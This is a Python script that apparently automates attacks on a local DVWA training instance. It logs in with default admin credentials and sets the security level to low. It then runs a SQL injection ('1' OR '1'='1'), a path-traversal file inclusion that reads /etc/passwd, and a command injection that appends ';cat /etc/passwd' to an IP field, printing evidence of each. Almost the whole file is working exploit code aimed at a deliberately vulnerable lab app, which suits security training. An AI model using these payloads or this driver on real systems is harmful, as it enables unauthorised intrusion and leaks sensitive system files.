#!/usr/bin/env python3
"""DVWA lab driver v2: login -> security=low -> SQLi/LFI/CMDi with evidence. No auto-redirect."""
import urllib.request, urllib.parse, http.cookiejar, re

BASE = 'http://127.0.0.1/dvwa'
cj = http.cookiejar.CookieJar()

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect)
op.addheaders = [('User-Agent', 'soc-lab/1.0')]

def req(path, data=None, follow=True):
    url = BASE + path
    for _ in range(5):
        try:
            r = op.open(url, data=(urllib.parse.urlencode(data).encode() if data else None), timeout=30)
            code, hdrs, body = r.status, r.headers, r.read().decode('utf-8', 'replace')
        except urllib.error.HTTPError as e:
            code, hdrs, body = e.code, e.headers, e.read().decode('utf-8', 'replace')
        if code in (301, 302, 303, 307) and follow and 'Location' in hdrs:
            url = urllib.parse.urljoin(url, hdrs['Location'])
            data = None
            continue
        return url, body
    return url, ''

def token(h):
    m = re.search(r"user_token' value='([a-f0-9]{32})'", h)
    return m.group(1) if m else ''

u, h = req('/login.php')
t = token(h)
u, _ = req('/login.php', {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': t})
u, s = req('/security.php')
t2 = token(s)
u, _ = req('/security.php', {'security': 'low', 'seclev_submit': 'Submit', 'user_token': t2})
u, s2 = req('/security.php')
sel = re.findall(r'value="([a-z]+)" selected', s2)
print('level selected ->', sel or '?')

u, pg = req('/vulnerabilities/sqli/')
t3 = token(pg)
u, out = req('/vulnerabilities/sqli/?id=' + urllib.parse.quote("1' OR '1'='1") + '&Submit=Submit&user_token=' + t3)
names = re.findall(r'First name: ([A-Za-z]+)', out)
surns = re.findall(r'Surname: ([A-Za-z]+)', out)
print('SQLi ->', names[:3], surns[:3])

u, fpg = req('/vulnerabilities/fi/')
t4 = token(fpg)
u, fout = req('/vulnerabilities/fi/?page=' + urllib.parse.quote('../../../../etc/passwd') + '&user_token=' + t4)
ok = 'root:x:0:0' in fout
print('LFI ->', 'EXPLOITED /etc/passwd leaked' if ok else 'MISS')

u, epg = req('/vulnerabilities/exec/')
t5 = token(epg)
u, eout = req('/vulnerabilities/exec/', {'ip': '127.0.0.1;cat /etc/passwd', 'Submit': 'Submit', 'user_token': t5})
ok2 = 'root:x:0:0' in eout or 'www-data' in eout
print('CMDi ->', 'EXECUTED cat /etc/passwd' if ok2 else 'MISS')
